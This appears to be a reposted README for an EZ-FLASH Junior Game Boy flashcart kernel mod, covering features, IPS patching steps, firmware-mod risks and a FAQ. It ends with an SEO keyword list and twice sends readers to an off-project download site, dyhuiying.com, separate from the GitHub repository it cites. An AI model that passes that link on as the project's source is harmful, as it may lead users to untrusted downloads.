
# EZ Flash Junior Kernel Mod

[![Platform](https://img.shields.io/badge/Platform-Game%20Boy%20%2F%20Game%20Boy%20Color-blue)](https://www.ezflash.cn/product/ezflash-junior/)
[![Cartridge](https://img.shields.io/badge/Flashcart-EZ--FLASH%20Junior-orange)](https://www.ezflash.cn/product/ezflash-junior/)
[![Kernel](https://img.shields.io/badge/Component-Custom%20Kernel-purple)](https://github.com/lukesau/ezgb)
[![License](https://img.shields.io/badge/Project%20Code-AGPL--3.0-green)](https://github.com/lukesau/ezgb)

A community-developed modification of the EZ-FLASH Junior kernel that improves the cartridge's menu, file browser, configuration options, and save-management workflow.

**Project download and patching resource:**

https://dyhuiying.com/s/file

## Overview

EZ Flash Junior Kernel Mod enhances the menu software used by the EZ-FLASH Junior Game Boy and Game Boy Color flash cartridge.

The original cartridge kernel is distributed as a compiled binary. This community project reverse-engineers and modifies supported kernel versions to add features while retaining the cartridge's existing game-loading workflow.

The modified kernel is supplied as patches that users apply to their own compatible original `ezgb.dat` file. The resulting file is placed on the microSD card and loaded by the cartridge at startup.

The kernel modification is separate from the cartridge's firmware or bootloader. Replacing the patched kernel file is reversible by restoring the original file.

## Key Features

- **Enhanced file browser:** Improved navigation and file-list rendering.
- **Continuous scrolling:** Navigate beyond the original browser's visible file limit.
- **File sorting:** Browse files in an organized order, with additional sorting options in newer builds.
- **Expanded file filtering:** Hide additional operating-system and auxiliary files from the browser.
- **Fast Launch:** Configure automatic launching of a preferred game.
- **Multiple Fast Launch methods:** Use `FLAUNCH.CFG`, per-game `.fastlaunch` control files, or automatic selection when only one ROM is present.
- **Custom themes:** Configure background, text, and accent colors.
- **Font options:** Select supported display fonts and sizes.
- **Save management:** Access save backup features and daily backup functionality in supported versions.
- **Improved interface:** Updated prompts, status messages, browser behavior, and settings screens.
- **Kernel version identification:** Check the active modified kernel version in the HELP tab.

Feature availability depends on the selected kernel version and installed patch.

## Technical Specifications

| Item | Description |
|---|---|
| Cartridge | EZ-FLASH Junior |
| Console family | Game Boy / Game Boy Color |
| Kernel file | `ezgb.dat` |
| Kernel execution | Game Boy-compatible cartridge environment |
| Patch format | IPS |
| Primary modification | Menu/kernel software |
| Installation method | Patch original kernel and replace microSD file |
| Supported stock kernels | 1.04e, 1.05e-0731, 1.05e-0918 |
| Firmware modification | Separate experimental option |
| Project license | AGPL-3.0 for the project's own work |

The original EZ-FLASH firmware and other proprietary cartridge components are not relicensed by this project.

## Compatibility

### Supported kernel versions

| Original kernel | Package / revision | Compatibility |
|---|---|---|
| 1.04e | FW4 | Supported |
| 1.05e-0731 | FW5 | Supported |
| 1.05e-0918 | FW5 | Supported |

Use the patch intended for the exact original kernel revision. The two FW5 variants are not interchangeable patch targets.

The 1.04e kernel has also been reported to work on FW5 cartridges. Confirm the project's current instructions before selecting a cross-version setup.

### Supported hardware

The EZ-FLASH Junior is designed for Game Boy and Game Boy Color game cartridges and is compatible with supported Game Boy-family systems.

The cartridge manufacturer lists support for Game Boy, Game Boy Pocket, Game Boy Color, and compatible Game Boy Advance systems.

Individual features may behave differently depending on the console, cartridge firmware, and microSD card.

## Firmware Features

The kernel mod and firmware mod are separate components.

### Kernel modification

The kernel modification changes the `ezgb.dat` file on the microSD card.

- Does not require flashing a new bootloader.
- Can be reverted by restoring the original `ezgb.dat`.
- Supports IPS patching and a browser-based patching workflow.
- Requires a patch matching the original kernel revision.

### Experimental firmware modification

Some project releases also provide an experimental firmware modification that changes the cartridge bootloader.

Reported additions include:

- An updated boot screen.
- Bootloader-level Fast Launch.
- Kernel selection when multiple kernel files are present.
- Additional microSD error handling on supported firmware.
- Boot ROM skip behavior in supported configurations.

**Warning:** The firmware modification is not equivalent to the reversible kernel patch. It writes to the cartridge's firmware. A failed or corrupted bootloader update can require SPI programmer or JTAG recovery.

Do not install the experimental firmware modification unless you understand the recovery implications and have verified the exact update package.

## System Requirements

- EZ-FLASH Junior cartridge.
- Compatible Game Boy-family console.
- microSD card supported by the cartridge.
- Computer with a microSD card reader.
- Original `ezgb.dat` from a supported kernel package.
- Matching IPS patch for the selected kernel version.
- IPS patching utility, or the project's browser-based patcher.
- Backup of the original kernel and important save files.

The cartridge manufacturer specifies FAT32 microSD support for cards in the 4–32 GB range. Follow the cartridge's documentation and the mod project's current instructions for card preparation.

## Download & Installation

### Download

Use the project download and patching resource:

https://dyhuiying.com/s/file

The project repository and release information are available here:

https://github.com/lukesau/ezgb

### Step 1: Back up the microSD card

1. Turn off the console.
2. Remove the EZ-FLASH Junior microSD card.
3. Connect it to a computer.
4. Copy the complete card contents to a safe backup location.
5. Keep an untouched copy of the original `ezgb.dat`.

Do not proceed without a recoverable backup.

### Step 2: Identify the original kernel

Determine which original kernel file is installed.

Supported patch targets include:

- 1.04e / FW4
- 1.05e-0731 / FW5
- 1.05e-0918 / FW5

If the revision is uncertain, obtain the original kernel from the corresponding official firmware package or verify the file using the project's documented checksum information.

### Step 3: Apply the matching patch

Choose one of the available methods:

**Browser-based patcher**

1. Open the project's patcher page.
2. Select or provide your original `ezgb.dat`.
3. Allow the patcher to identify and validate the kernel.
4. Apply the matching modification.
5. Save the patched output.

**IPS patching utility**

1. Download the IPS patch for your exact kernel revision.
2. Open an IPS patching utility.
3. Select the original `ezgb.dat` as the source file.
4. Select the matching IPS patch.
5. Apply the patch and save the resulting file.

Do not apply a patch intended for a different kernel revision.

### Step 4: Install the modified kernel

1. Rename the patched output to `ezgb.dat` if necessary.
2. Copy it to the root directory of the microSD card.
3. Preserve the original kernel separately.
4. Safely eject the microSD card.
5. Reinsert it into the EZ-FLASH Junior.
6. Start the console and allow the cartridge to load.

The HELP tab should display the modified kernel version when the patch is active.

### Step 5: Verify operation

- Confirm that the cartridge reaches its menu.
- Open the HELP tab and check the modification version.
- Navigate through the file browser.
- Launch a game and verify normal operation.
- Check save behavior before enabling optional automatic backup features.

## Configuration & Management

### Fast Launch

Fast Launch supports several configuration methods in the modified kernel.

Depending on the build, you can:

- Specify a game path in `FLAUNCH.CFG`.
- Create a `<rom name>.fastlaunch` control file for a game in the microSD root.
- Use automatic selection when only one ROM is available.

Consult the instructions accompanying the exact release for supported file naming and path syntax.

### Themes and colors

Newer builds provide expanded theme and font settings.

Depending on the selected kernel and firmware configuration, options can include:

- Background color.
- Text color.
- Accent color.
- Display font and size.
- Preset themes.

Some theme options depend on the console's display capabilities.

### Save backups

Supported releases include save backup improvements, including a daily backup option.

Before relying on automatic backup:

1. Confirm that the save-management features are available in your installed version.
2. Check that the microSD card has sufficient free space.
3. Verify that backup files are being created.
4. Keep an independent copy of important saves.

### Restoring the original kernel

1. Turn off the console.
2. Remove the microSD card.
3. Replace the modified `ezgb.dat` with the original backup.
4. Safely eject the card.
5. Reinsert it and start the console.

This restores the original kernel file without requiring a firmware downgrade.

## Troubleshooting

| Problem | Possible cause | Recommended action |
|---|---|---|
| Cartridge does not load the menu | Incorrect or damaged `ezgb.dat` | Restore the original kernel and verify the patch target |
| Modified version is not displayed | Stock kernel is still being loaded | Check the filename and location of `ezgb.dat` |
| Patcher rejects the file | Unsupported kernel or incorrect source file | Verify the original kernel revision and checksum |
| Browser displays unexpected files | File filtering settings or unsupported file type | Review the browser configuration and release notes |
| Fast Launch does not start a game | Incorrect configuration or control-file name | Check the selected Fast Launch method and file path |
| Game does not launch | Unsupported ROM, damaged file, or compatibility issue | Test a known-good compatible ROM |
| Save backup is missing | Backup option disabled or unsupported in that build | Check settings and verify the backup destination |
| Cartridge reports a microSD error | Card compatibility, formatting, or card condition | Test a known-good card and follow the cartridge documentation |
| Cartridge fails after firmware modification | Possible bootloader update failure | Consult the project's firmware recovery documentation |

Do not interrupt a cartridge firmware update. A kernel-file replacement and a firmware flash are different operations with different recovery risks.

## FAQ

### 1. What is EZ Flash Junior Kernel Mod?

It is a community modification of the EZ-FLASH Junior cartridge's menu/kernel software, adding browser, configuration, launch, and save-management features.

### 2. Does it install custom firmware on the Game Boy?

No. The standard kernel modification replaces the cartridge's `ezgb.dat` file. It does not install a custom operating system on the console.

### 3. Which original kernels are supported?

The documented patch targets include 1.04e, 1.05e-0731, and 1.05e-0918. Use the matching patch for your exact revision.

### 4. Is the kernel modification reversible?

Yes. Restore the original `ezgb.dat` file to the microSD card to return to the original kernel.

### 5. Does the kernel mod require a firmware update?

The standard kernel patch does not require a firmware update. The experimental firmware modification is a separate optional component.

### 6. What is Fast Launch?

Fast Launch is a feature that can automatically start a selected game using supported configuration methods instead of requiring manual navigation through the browser.

### 7. Can I customize the menu appearance?

Supported releases include theme, color, and font options. Available settings vary by kernel build and console configuration.

### 8. Does the project support save backups?

Yes. Supported versions include save-management improvements and daily backup functionality. Verify that the feature is available and configured in your installed build.

### 9. Can I use any IPS patch with my kernel?

No. The patch must match the original kernel revision. Applying an incompatible patch can produce an unusable kernel file.

### 10. Is the experimental firmware modification safe?

It carries additional risk because it writes to the cartridge bootloader. A serious update failure can require hardware-level recovery using an SPI programmer or JTAG.

### 11. Do I need to modify my Game Boy console?

No. The standard modification is applied to the EZ-FLASH Junior microSD kernel file, not to the Game Boy console itself.

### 12. Where can I find patches and project updates?

Check the project repository and release information for current patches, version-specific instructions, and compatibility notes.

## SEO Keywords

EZ Flash Junior, EZ-FLASH Junior Kernel Mod, EZ Flash Junior custom kernel, EZGB DAT, ezgb.dat patch, Game Boy flashcart, Game Boy Color flashcart, Game Boy cartridge, EZ Flash Junior firmware, EZ Flash Junior IPS patch, EZ Flash kernel, custom Game Boy kernel, Game Boy homebrew, Game Boy modding, GBC homebrew, Game Boy Color modding, flashcart kernel modification, EZ Flash file browser, Game Boy ROM loader, Fast Launch Game Boy, EZ Flash save backup, Game Boy save management, Game Boy custom themes, EZ Flash Junior compatibility, IPS kernel patch, Game Boy cartridge tools, EZ Flash Junior setup
